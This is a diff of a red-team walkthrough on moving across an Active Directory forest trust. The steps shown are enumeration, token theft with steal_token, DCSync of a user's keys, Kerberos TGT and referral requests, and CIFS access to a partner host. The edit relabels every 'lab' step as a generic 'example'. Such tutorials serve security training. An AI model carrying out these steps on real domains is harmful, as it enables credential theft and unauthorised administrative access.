@@ -17,7 +17,7 @@ Trust:   PARTNER → CONTOSO
 Access:  CONTOSO users → PARTNER resources, if authorized
 ```
 
-A forest trust does not automatically grant administrative rights. The practical goal is to identify a CONTOSO identity that already has permissions in PARTNER. The lab demonstrates this chain:
+A forest trust does not automatically grant administrative rights. The practical goal is to identify a CONTOSO identity that already has permissions in PARTNER. The example demonstrates this chain:
 
 ```text
 CONTOSO\rsteel
@@ -26,7 +26,7 @@ CONTOSO\rsteel
   → policy-defined permissions on applicable PARTNER hosts
 ```
 
-The separate `pchilds` example later uses different identity data. Do not combine its RID and groups with the lab's `rsteel` credentials.
+The separate `pchilds` example later uses different identity data. Do not combine its RID and groups with `rsteel` credentials.
 
 ## 2. Enumerate the trust and foreign principals
 
@@ -48,7 +48,7 @@ ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102) --attribute
 
 # Enumerate direct user and group members of the source group
 ldapsearch "(&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Partner Jump Users,CN=Users,DC=contoso,DC=com))" --attributes distinguishedName
-# Lab member: Robert Steel (rsteel)
+# Example member: Robert Steel (rsteel)
 ```
 
 A Foreign Security Principal (FSP) represents an external SID in the resource domain. Its `memberOf` describes membership there; it is not a TDO attribute. Resolve nested groups separately if they appear. The direct-member query is not recursive and is not a complete effective-membership calculation.
@@ -74,7 +74,7 @@ ldapsearch (objectClass=groupPolicyContainer) --hostname par-dc-1.partner.com --
 download "\\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
 ```
 
-The lab's `[Group Membership]` section contains:
+The policy template contains the following `[Group Membership]` entries:
 
 ```ini
 *S-1-5-21-4244029708-1901239654-2578485347-1104__Memberof = *S-1-5-32-544
@@ -88,20 +88,20 @@ ldapsearch (objectSid=S-1-5-21-4244029708-1901239654-2578485347-1104) --hostname
 # Example: Contoso Users; member includes the CONTOSO -6102 FSP
 
 ldapsearch "(&(|(objectClass=organizationalUnit)(objectClass=domain))(gPLink=*{DFE606B4-CA59-4AD6-9BCE-55AF35888129}*))" --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes objectClass,name,gPLink
-# Lab: policy linked at the partner domain root
+# Example: policy linked at the partner domain root
 ```
 
 A group membership or GPO link alone does not prove administrative access to every machine. Check effective application, filtering, inheritance and target configuration. Use the resource access result as the final check for the host being tested.
 
-## 4. Lab path: obtain the authorized user's TGT
+## 4. Example workflow: obtain the authorized user's TGT
 
 Discovery can run in a suitable ordinary user context. The following credential acquisition step requires separate replication rights in CONTOSO; the trust does not provide them.
 
 ```shell
-# Optional lab transition from an elevated Beacon to the identified DA token
+# Optional context transition from an elevated Beacon to the identified DA token
 ps
 steal_token <DYORK_PID>
-# Lab identity: CONTOSO\dyork
+# Example identity: CONTOSO\dyork
 
 # In the context with the required replication rights
 dcsync contoso.com CONTOSO\rsteel
@@ -120,7 +120,7 @@ Save the TGT in **PowerShell on the operator's machine**:
 [IO.File]::WriteAllBytes('C:\Users\Attacker\Desktop\rsteel.kirbi', [Convert]::FromBase64String('<RSTEEL_TGT_BASE64>'))
 ```
 
-## 5. Lab path: referral, CIFS ticket and import
+## 5. Example workflow: referral, CIFS ticket and import
 
 Run the requests from Beacon:
 
@@ -150,7 +150,7 @@ run klist
 # Server: cifs/par-jmp-1.partner.com
 
 ls \\par-jmp-1.partner.com\c$
-# Expected in this lab: directory listing if the identified policy grants effective access
+# Expected in this example: directory listing if the identified policy grants effective access
 
 kerberos_ticket_purge
 rev2self
@@ -160,7 +160,7 @@ rev2self
 
 The `pchilds` example uses a compromised trust key rather than requesting the referral with `rsteel`'s legitimate TGT. It still relies on source group membership accepted across the trust. SID filtering prevents simply carrying the parent-child ExtraSids technique into a different forest.
 
-This path requires replication rights in CONTOSO and the correct directional trust key. It is an alternative, not an additional lab stage.
+This path requires replication rights in CONTOSO and the correct directional trust key. It is an alternative, not an additional example stage.
 
 ```shell
 # In the authorized replication context in CONTOSO
@@ -213,7 +213,7 @@ Ticket construction and acceptance depend on KDC validation and policy. A valid 
 | Symptom | What to check |
 |---|---|
 | No FSP membership appears | Query the FSP in the resource domain and resolve its source SID |
-| Source members appear inconsistent | Distinguish the rsteel lab and pchilds example; resolve nested groups |
+| Source members appear inconsistent | Distinguish the rsteel example and pchilds example; resolve nested groups |
 | GPO is linked but access is denied | Actual policy application, filtering and target permissions |
 | Replication fails | Rights in the domain being replicated |
 | TGS request fails | Correct referral, remote KDC, SPN, encryption and ticket validity |
@@ -223,7 +223,7 @@ Reference for trust-boundary SID filtering: [Microsoft PAC specification](https:
 
 ## 8. Quick checklist
 
-The main checklist follows the rsteel lab. The trust-key/pchilds route above is a separate alternative.
+The main checklist follows the rsteel example. The trust-key/pchilds route above is a separate alternative.
 
 ```text
 TRUST AND MEMBERSHIP
@@ -242,7 +242,7 @@ RESOURCE PERMISSIONS
 [ ] Check effective application rather than assuming every host is covered
 
 RSTEEL TGT — IF NOT ALREADY AVAILABLE
-[ ] Optional lab context: ps, then steal_token <DYORK_PID>
+[ ] Optional context: ps, then steal_token <DYORK_PID>
 [ ] dcsync contoso.com CONTOSO\rsteel → requires replication rights
 [ ] krb_asktgt /user:rsteel /aes256:<RSTEEL_AES256>
 [ ] Local PowerShell: [IO.File]::WriteAllBytes('C:\path\rsteel.kirbi', [Convert]::FromBase64String('<RSTEEL_TGT_BASE64>'))
